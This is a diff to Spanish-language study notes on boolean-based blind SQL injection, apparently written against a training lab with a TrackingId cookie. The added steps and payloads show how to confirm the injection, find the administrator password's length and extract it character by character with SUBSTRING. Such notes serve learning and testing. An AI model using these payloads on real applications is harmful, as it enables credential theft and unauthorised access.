@@ -11,6 +11,8 @@ Esto imposibilita técnicas visibles como ataques con `UNION`, pero aún se pued
 
 ### 1. Condicionales en las respuestas (Boolean-based)
 
+1. Confirmar que el parámetro es vulnerable con condiciones triviales (`' AND '1'='1` / `' AND '1'='2`).
+
 La aplicación cambia de comportamiento según si la condición inyectada es verdadera o falsa.
 Ejemplo con cookie `TrackingId`:
 
@@ -19,8 +21,19 @@ Cookie: TrackingId=xyz' AND '1'='1   --> devuelve "Welcome back"
 Cookie: TrackingId=xyz' AND '1'='2   --> no devuelve "Welcome back"
 ```
 
-Esto permite inferir bit a bit datos sensibles (ej. password del admin) con funciones como `SUBSTRING`:
+2. Determinar la longitud aproximada probando `LENGTH`/`LEN` con booleanos o avanzando hasta obtener false cuando la posición excede la longitud.
+ ```sql
+  ' AND (SELECT LENGTH(Password) FROM Users WHERE Username='Administrator') > 10 --
+  ```
 
+Esto permite inferir bit a bit datos sensibles con funciones como `SUBSTRING`:
+
+3. Para posición `i` probar caracteres `c` hasta encontrar el verdadero:
+
+   * `' AND SUBSTRING((SELECT Password ...), i, 1) = 'c' -- `
+   * o usar comparaciones `>` / `<` para acelerar (`> 'm'`, etc.).
+
+Ejemplo:
 ```sql
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)='s
 ```
